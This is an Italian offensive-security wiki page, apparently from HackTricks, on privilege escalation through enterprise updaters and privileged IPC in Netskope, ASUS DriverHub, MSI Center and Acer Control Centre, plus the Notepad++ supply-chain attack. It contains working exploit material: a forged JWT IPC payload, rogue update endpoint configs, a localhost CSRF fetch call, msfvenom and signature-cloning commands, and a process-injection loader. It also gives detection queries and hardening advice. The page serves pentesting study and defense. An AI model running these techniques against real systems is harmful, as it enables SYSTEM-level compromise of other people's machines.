# Abuso degli Auto-Updater Enterprise e IPC privilegiata (es. Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Questa pagina generalizza una classe di Windows local privilege escalation chains riscontrate in agent endpoint e updater enterprise che espongono un'interfaccia IPC a basso attrito e un flusso di aggiornamento privilegiato. Un esempio rappresentativo è Netskope Client for Windows < R129 (CVE-2025-0309), dove un utente con privilegi ridotti può costringere la registrazione su un server controllato dall'attaccante e poi consegnare un MSI maligno che il servizio SYSTEM installa.

Idee chiave riutilizzabili contro prodotti simili:
- Abusare dell'IPC localhost di un servizio privilegiato per forzare la reregistrazione o la riconfigurazione verso un server dell'attaccante.
- Implementare gli endpoint di aggiornamento del vendor, distribuire una rogue Trusted Root CA e indirizzare l'updater verso un pacchetto maligno "signed".
- Evitare controlli deboli del signer (CN allow-lists), flag digest opzionali e proprietà MSI permissive.
- Se l'IPC è "encrypted", derivare la key/IV da identificatori macchina leggibili da tutti memorizzati nel registro.
- Se il servizio restringe i caller per image path/process name, injectare in un processo allow-listed o spawnarne uno in suspended e bootstrapare la propria DLL via una minimal thread-context patch.

---
## 1) Forzare la registrazione su un server dell'attaccante tramite IPC su localhost

Molti agent includono un processo UI in user-mode che comunica con un servizio SYSTEM tramite localhost TCP usando JSON.

Osservato in Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Flusso di exploit:
1) Creare un JWT enrollment token i cui claims controllano l'host backend (es. AddonUrl). Usare alg=None in modo che non sia richiesta una firma.
2) Inviare il messaggio IPC che invoca il provisioning command con il tuo JWT e il tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Il servizio inizia a contattare il tuo rogue server per enrollment/config, ad esempio:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Note:
- Se la verifica del caller è basata su path/nome, origina la richiesta da un allow-listed vendor binary (vedi §4).

---
## 2) Dirottare il canale di update per eseguire codice come SYSTEM

Una volta che il client comunica con il tuo server, implementa gli endpoint previsti e indirizzalo verso un MSI malevolo. Sequenza tipica:

1) /v2/config/org/clientconfig → Restituisci una config JSON con un intervallo di aggiornamento molto breve, ad esempio:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Restituisce un certificato CA in formato PEM. Il servizio lo installa nello store Trusted Root della macchina locale.
3) /v2/checkupdate → Fornisce metadata che puntano a un MSI malevolo e a una versione fasulla.

Bypassing common checks seen in the wild:
- Signer CN allow-list: il servizio potrebbe verificare solo che il Subject CN sia “netSkope Inc” o “Netskope, Inc.”. La tua rogue CA può emettere un leaf con quel CN e firmare l’MSI.
- CERT_DIGEST property: includi una proprietà MSI innocua chiamata CERT_DIGEST. Nessuna enforcement all’installazione.
- Optional digest enforcement: flag di config (es., check_msi_digest=false) disabilita validazioni crittografiche aggiuntive.

Risultato: il servizio SYSTEM installa il tuo MSI da
C:\ProgramData\Netskope\stAgent\data\*.msi
eseguendo codice arbitrario come NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

From R127, Netskope wrapped IPC JSON in an encryptData field that looks like Base64. Reversing showed AES with key/IV derived from registry values readable by any user:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Gli attacker possono riprodurre la crittografia e inviare comandi validi cifrati da un utente standard. Suggerimento generale: se un agent improvvisamente “critta” la sua IPC, cerca device ID, product GUID, install ID sotto HKLM come materiale per derivare key/IV.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Alcuni servizi cercano di autenticare il peer risolvendo il PID della connessione TCP e confrontando il path/nome dell’immagine con binari vendor allow-listati sotto Program Files (es., stagentui.exe, bwansvc.exe, epdlp.exe).

Due bypass pratici:
- DLL injection in un processo allow-listato (es., nsdiag.exe) e proxy dell’IPC dall’interno di esso.
- Spawnare un binario allow-listato in stato suspended e bootstrap della tua proxy DLL senza CreateRemoteThread (vedi §5) per soddisfare le regole tamper-enforced del driver.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

I prodotti spesso includono un minifilter/OB callbacks driver (es., Stadrv) che rimuove diritti pericolosi dagli handle verso processi protetti:
- Process: rimuove PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: limita a THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Un loader user-mode affidabile che rispetta questi vincoli:
1) CreateProcess di un binario vendor con CREATE_SUSPENDED.
2) Ottenere gli handle ancora consentiti: PROCESS_VM_WRITE | PROCESS_VM_OPERATION sul processo, e un handle thread con THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (o solo THREAD_RESUME se patchi codice a un RIP noto).
3) Sovrascrivere ntdll!NtContinue (o un altro thunk iniziale garantito mappato) con una piccola stub che chiama LoadLibraryW sul path della tua DLL, poi ritorna.
4) ResumeThread per triggerare la stub in-process, caricando la tua DLL.

Poiché non hai mai usato PROCESS_CREATE_THREAD o PROCESS_SUSPEND_RESUME su un processo già-protetto (l’hai creato tu), la policy del driver è soddisfatta.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) automatizza una rogue CA, la firma di un MSI malevolo, e serve gli endpoint necessari: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope è un custom IPC client che costruisce messaggi IPC arbitrari (opzionalmente AES-encrypted) e include l’injection via suspended-process per originare da un binario allow-listato.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub include un servizio HTTP user-mode (ADU.exe) su 127.0.0.1:53000 che si aspetta chiamate dal browser provenienti da https://driverhub.asus.com. L’origin filter esegue semplicemente `string_contains(".asus.com")` sull’header Origin e sulle URL di download esposte da `/asus/v1.0/*`. Qualsiasi host controllato dall’attaccante come `https://driverhub.asus.com.attacker.tld` quindi passa il controllo e può inviare richieste che mutano stato via JavaScript. See [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) per ulteriori pattern di bypass.

Flusso pratico:
1) Registrare un dominio che includa `.asus.com` e ospitare lì una pagina malevola.
2) Usare `fetch` o XHR per chiamare un endpoint privilegiato (es., `Reboot`, `UpdateApp`) su `http://127.0.0.1:53000`.
3) Inviare il JSON body atteso dall’handler – il frontend packato mostra lo schema qui sotto.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Anche il PowerShell CLI mostrato qui sotto funziona quando l'Origin header viene falsificato con il valore attendibile:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Qualsiasi visita del browser al sito dell'attaccante diventa quindi un CSRF locale a 1 clic (o 0 clic tramite `onload`) che avvia un helper SYSTEM.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` scarica eseguibili arbitrari definiti nel corpo JSON e li mette in cache in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. La validazione dell'URL di download riutilizza la stessa logica basata su substring, quindi `http://updates.asus.com.attacker.tld:8000/payload.exe` viene accettato. Dopo il download, ADU.exe verifica semplicemente che il PE contenga una firma e che la stringa Subject corrisponda ad ASUS prima di eseguirlo – niente `WinVerifyTrust`, nessuna validazione della catena.

Per weaponizzare il flusso:
1) Create un payload (es., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone lo signer di ASUS dentro di esso (es., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Hostate `pwn.exe` su un dominio lookalike `.asus.com` e triggerate UpdateApp tramite il browser CSRF di cui sopra.

Poiché sia i filtri Origin che quelli URL si basano su substring e il controllo del signer confronta solo stringhe, DriverHub scarica ed esegue il binario dell'attaccante nel suo contesto elevato.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

Il servizio SYSTEM di MSI Center espone un protocollo TCP dove ogni frame è `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Il componente core (Component ID `0f 27 00 00`) include `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Il suo handler:
1) Copia l'eseguibile fornito in `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifica la firma tramite `CS_CommonAPI.EX_CA::Verify` (il subject del certificato deve essere “MICRO-STAR INTERNATIONAL CO., LTD.” e `WinVerifyTrust` deve avere esito positivo).
3) Crea un'attività pianificata che esegue il file temporaneo come SYSTEM con argomenti controllati dall'attaccante.

Il file copiato non è bloccato tra la verifica e `ExecuteTask()`. Un attaccante può:
- Inviare Frame A che punta a un binario legittimo firmato MSI (garantisce che il controllo della firma passi e la task venga messa in coda).
- Competere tramite ripetuti Frame B che puntano a un payload maligno, sovrascrivendo `MSI Center SDK.exe` subito dopo il completamento della verifica.

Quando lo scheduler scatta, esegue il payload sovrascritto come SYSTEM nonostante la validazione dell'originale. Uno sfruttamento affidabile utilizza due goroutines/threads che spammano CMD_AutoUpdateSDK finché la finestra TOCTOU non viene vinta.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Ogni plugin/DLL caricato da `MSI.CentralServer.exe` riceve un Component ID memorizzato sotto `HKLM\SOFTWARE\MSI\MSI_CentralServer`. I primi 4 byte di un frame selezionano quel componente, permettendo agli attaccanti di instradare comandi verso moduli arbitrari.
- I plugin possono definire i propri task runner. `Support\API_Support.dll` espone `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` e chiama direttamente `API_Support.EX_Task::ExecuteTask()` con **no signature validation** – qualsiasi utente locale può puntarlo a `C:\Users\<user>\Desktop\payload.exe` e ottenere l'esecuzione come SYSTEM in modo deterministico.
- Sniffare il loopback con Wireshark o strumentare i binari .NET in dnSpy rivela rapidamente la mappatura Component ↔ command; client personalizzati in Go/ Python possono quindi riprodurre i frame.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) espone `\\.\pipe\treadstone_service_LightMode`, e il suo discretionary ACL permette client remoti (es., `\\TARGET\pipe\treadstone_service_LightMode`). Inviare command ID `7` con un percorso file invoca la routine di spawning del processo del servizio.
- La libreria client serializza un byte terminatore magico (113) insieme agli argomenti. La strumentazione dinamica con Frida/`TsDotNetLib` (vedi [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) per suggerimenti) mostra che l'handler nativo mappa questo valore su un `SECURITY_IMPERSONATION_LEVEL` e un SID di integrità prima di chiamare `CreateProcessAsUser`.
- Sostituire 113 (`0x71`) con 114 (`0x72`) ricade nel branch generico che mantiene l'intero token SYSTEM e imposta un SID di alta integrità (`S-1-16-12288`). Il binario avviato quindi gira come unrestricted SYSTEM, sia localmente che cross-machine.
- Combinalo con il flag installer esposto (`Setup.exe -nocheck`) per far girare ACC anche su VM di laboratorio e testare la pipe senza hardware del vendor.

Questi bug di IPC evidenziano perché i servizi localhost devono imporre mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) e perché l'helper di ogni modulo per “run arbitrary binary” deve condividere le stesse verifiche del signer.

---
## Remote supply-chain hijack via weak updater validation (WinGUp / Notepad++)

Versioni più vecchie degli updater Notepad++ basati su WinGUp non verificavano completamente l'autenticità dell'update. Quando gli attaccanti compromettevano il provider di hosting del server di aggiornamento, potevano manomettere il manifesto XML e reindirizzare solo client selezionati verso URL dell'attaccante. Poiché il client accettava qualsiasi risposta HTTPS senza imporre sia una catena di certificati trusted sia una firma PE valida, le vittime scaricavano ed eseguivano un NSIS trojanizzato `update.exe`.

Flusso operativo (nessun exploit locale richiesto):
1. **Infrastructure interception**: compromettere il CDN/hosting e rispondere alle verifiche di update con metadata dell'attaccante che puntano a un URL di download maligno.
2. **Trojanized NSIS**: l'installer recupera/esegue un payload e abusa di due catene di esecuzione:
- **Bring-your-own signed binary + sideload**: includere il binario firmato Bitdefender `BluetoothService.exe` e posizionare una `log.dll` malevola nel suo search path. Quando il binario firmato viene eseguito, Windows sideloads `log.dll`, che decripta e carica reflectively il backdoor Chrysalis (Warbird-protected + API hashing per ostacolare la detection statica).
- **Scripted shellcode injection**: NSIS esegue uno script Lua compilato che usa API Win32 (es., `EnumWindowStationsW`) per iniettare shellcode e staggiare Cobalt Strike Beacon.

Considerazioni di hardening/detection per qualsiasi auto-updater:
- Imporre la **verifica di certificato + firma** dell'installer scaricato (pin del signer del vendor, rifiutare CN/catena non corrispondenti) e firmare il manifesto di aggiornamento stesso (es., XMLDSig). Bloccare i redirect controllati dal manifesto a meno che non siano validati.
- Considerare il **BYO signed binary sideloading** come un pivot di rilevamento post-download: generare allerta quando un EXE firmato del vendor carica una DLL con nome proveniente da fuori il suo percorso install canonico (es., Bitdefender loading `log.dll` from Temp/Downloads) e quando un updater deposita/esegue installer dalla cartella temp con firme non del vendor.
- Monitorare gli **malware-specific artifacts** osservati in questa catena (utili come pivot generici): mutex `Global\Jdhfv_1.0.1`, scritture anomale di `gup.exe` in `%TEMP%`, e stadi di iniezione shellcode guidati da Lua.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> che avvia un installer non di Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Questi schemi si applicano a qualsiasi updater che accetta unsigned manifests o non esegue il pin dei installer signers — network hijack + malicious installer + BYO-signed sideloading consentono remote code execution sotto le spoglie di “trusted” updates.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
